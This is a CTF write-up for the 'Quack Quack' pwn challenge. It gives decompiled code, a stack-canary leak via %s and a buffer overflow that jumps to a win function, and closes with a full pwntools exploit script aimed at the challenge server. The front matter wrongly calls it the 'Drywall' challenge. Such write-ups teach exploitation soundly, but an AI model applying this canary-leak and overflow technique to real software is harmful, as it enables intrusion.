---
layout: post
title: "Quack Quack - from ApocalypseCTF"
date: 2025-03-23
categories: [PWN]
tags: [userland, pwn, binary-exploitation]
description: "Detailed writeup of the Drywall challenge from ApocalypseCTF 2025."
---


# Quack Quack - Pwn Challenge Writeup

**Challenge Name**: Quack Quack  
**Category**: Pwn  
*(Kept this writeup straightforward and on point)*

---

## Challenge Description

On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it’s time to face the Duck!

---

## Initial Recon

Binary starts with:

```
Quack the Duck!

>
```

It reads 102 bytes from you, checks if you included "Quack Quack ", and if not, exits with an error. If you pass the check, it uses `%s` to print something from your input.

Classic setup for a **stack canary leak + buffer overflow**. The goal? Defeat the duck and call the hidden `duck_attack()` function.

---

## Decompiled Function (Ghidra Output)

Here's the function `duckling()`:

```c
void duckling(void) {
  char *off;
  long in_FS_OFFSET;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_88 = 0; local_80 = 0; local_78 = 0; local_70 = 0;
  local_68 = 0; local_60 = 0; local_58 = 0; local_50 = 0;
  local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0;
  local_28 = 0; local_20 = 0;

  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0, &local_88, 102);
  off = strstr((char *)&local_88, "Quack Quack ");
  if (off == NULL) {
    error("Where are your Quack Manners?!\n");
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", off + 32);
  read(0, &local_68, 106);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

### Key Points:
- Reads 102 bytes into `local_88` (which is stack memory).
- Checks for "Quack Quack " with `strstr()`.
- Then prints from `off + 32` with `%s`.
- `%s` stops at NULL, meaning **stack canary leak is tricky**.
- Ends with a standard stack canary check.

Discovered win function: `duck_attack()` at `0x40137f`. That's the target for RIP.

---

## Exploit Strategy

### Canary Leak Problems

- The canary ends with a **NULL byte**, so `%s` cuts off before printing the full 8 bytes.
- Theory says 88 bytes of padding should align us before the canary.
- Reality: `%s` refuses to leak it properly with `A*88`.

### The Fix

- Send `A*89 + "Quack Quack "`.
- This tricks `%s` into starting exactly at the canary, leaking 8 bytes.
- Due to the NULL byte, we only get **7 useful bytes** and 1 garbage byte that is most significat byte .

### Adjust the Leak

- Strip off the **MSB (garbage byte)**.
- Append a NULL byte to reconstruct the correct canary.
- Now we have a valid canary to use in the overflow.

---

## Payloads and Explanation (disclaimer: i suck at coding XD)

### Payload 1 (Leak Canary)

```python
padding = b'A' * 89
quack_str = b"Quack Quack "
filler = b'B' * (102 - len(padding) - len(quack_str))

payload = padding + quack_str + filler
```

- Send this payload first.
- It gets us a leak of 8 bytes.

Fix the canary:

```python
leak = p.recv(8)
canary = u64(leak)
canary_fixed = (canary & 0x00FFFFFFFFFFFFFF) << 8
```

---

### Payload 2 (Overflow)

```python
payload2 = b"B"*88 + p64(canary_fixed) + p64(0x0) + p64(0x40137f)
```

- 88 bytes padding
- Valid canary
- Fake RBP
- Jump to `duck_attack()`

---

## My Garbage Exploit Script (Skill Issue hehe)

Okay, here’s my terrible script. It's functional but ugly — because I'm a bad programmer kek:

```python
from pwn import *

p = remote('94.237.60.63', 51435)

padding = b'A' * 89
quack_str = b"Quack Quack "
filler = b'B' * (102 - len(padding) - len(quack_str))

payload = padding + quack_str + filler

p.recvuntil(b'> ')
p.send(payload)

p.recvuntil(b'Quack Quack ')
leak = p.recv(8)
log.success(f"Leaked data: {leak}")
canary = u64(leak)
log.success(f"Canary: {hex(canary)}")

canary_adjusted = (canary & 0x00FFFFFFFFFFFFFF) << 8
log.success(f"Adjusted Canary: {hex(canary_adjusted)}")

p.recvuntil(b'> ')
payload2 = b"B"*88 + p64(canary_adjusted) + p64(0x0) + p64(0x40137f)
p.sendline(payload2)

p.interactive()
```

---

## Final Thoughts

Leaking the canary was a bit cursed due to `%s` and NULL-byte interactions, but once that hurdle was cleared, everything fell into place.

Solid pwn challenge. Now, hand over that PlayStation. Quack Quack. 🦆

